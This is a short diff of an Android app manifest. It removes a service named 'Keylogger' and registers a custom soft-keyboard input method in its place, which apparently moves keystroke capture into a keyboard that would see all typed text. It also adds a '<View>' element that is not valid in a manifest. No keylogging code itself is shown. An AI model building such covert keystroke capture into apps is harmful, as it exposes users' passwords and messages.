@@ -18,8 +18,14 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
-        <service android:name=".Keylogger"
-            android:label="@string/app_name"/>
+        <service android:name=".softkeyboard.SoftKeyboard"
+            android:permission="android.permission.BIND_INPUT_METHOD">
+        <meta-data android:name="android.view.im" android:resource="@xml/method"/>
+        <intent-filter>
+            <action android:name="android.view.InputMethod" />
+        </intent-filter>
+        </service>
+
         <activity android:name=".MainActivity"/>
         <activity android:name=".GalleryActivity"/>
         <activity android:name=".LeisureActivity"/>
@@ -30,6 +36,8 @@
         <activity android:name=".CheckActivity"/>
         <activity android:name=".MapActivity"/>
         <activity android:name=".LoginActivity"/>
+
+
 
         <View android:name=".WordComposer"></View>
     </application>
